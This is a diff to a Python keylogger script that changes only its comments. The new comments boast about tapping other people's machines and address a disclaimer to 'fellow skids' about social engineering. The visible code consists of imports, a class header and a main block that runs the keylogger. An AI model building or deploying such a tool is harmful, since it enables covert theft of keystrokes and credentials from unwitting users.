@@ -1,4 +1,6 @@
 # dont ask why and or how i got an A in bulgarian language and literature
+# also holy fuck we're using outdated software (AND TECH), not that i wont be able to tap ur shit but maybe get better NERD?!
+# fellow skids use with caution thanks i am not responsible for your dogshit social engineering or below average ninja skills
 
 import ctypes
 import time
@@ -52,5 +54,3 @@ class Keylogger:
 if __name__ == "__main__":
     kl = Keylogger()
     kl.run()
-
-# fellow skids use with caution thanks i am not responsible for your dogshit social engineering or below average ninja skills
